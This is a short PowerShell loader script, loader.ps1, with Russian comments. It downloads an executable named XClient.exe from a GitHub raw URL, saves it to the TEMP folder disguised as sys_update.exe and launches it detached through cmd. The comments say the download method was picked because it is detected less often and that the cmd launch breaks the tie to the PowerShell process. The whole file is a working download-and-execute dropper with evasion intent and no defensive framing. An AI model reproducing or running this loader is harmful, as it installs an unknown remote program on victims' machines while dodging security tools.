# loader.ps1
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

# Используем системный метод загрузки, который реже палится
(New-Object System.Net.WebClient).DownloadFile($u, $p)

# Запуск через cmd, чтобы разорвать связь с процессом PowerShell
cmd /c start /b $p
